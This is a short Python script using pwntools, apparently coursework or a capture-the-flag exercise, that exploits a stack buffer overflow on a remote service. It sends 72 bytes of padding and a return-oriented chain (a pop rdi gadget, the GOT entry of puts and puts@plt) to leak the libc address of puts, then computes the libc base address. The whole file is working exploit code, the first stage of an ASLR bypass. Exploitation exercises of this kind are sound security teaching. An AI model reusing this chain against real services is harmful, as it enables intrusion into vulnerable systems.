from pwn import process, connect, p64

# GOAL: to leak function address of puts() in libc, which is stored in GOT.

# To leak the content at address 0x601018
# To print the content at location of 0x601018
# call puts(0x601018)

def leak_libc():
    # TODO: construct string attack
    value = p64(0x601018)
    pop_rdi = p64(0x4008b3)
    plt_puts = p64(0x4005c0)
    chain = pop_rdi + value + plt_puts
    attack = b'a' * 72 + chain
    return attack

def main():
    # p = process(["./ld-2.31.so", "./stack"], env = {"LD_PRELOAD": "./libc-2.31.so"})
    p = connect("asu-cse545.com", 6666)
    attack = leak_libc()
    p.sendline(attack)
    print(p.recvline())
    print(p.recvline())
    s = p.recvline()

    base = int.from_bytes(s.strip(), "little") - 0x875a0

    print("base address: 0x%x" % base)



if __name__ == "__main__":
    main()
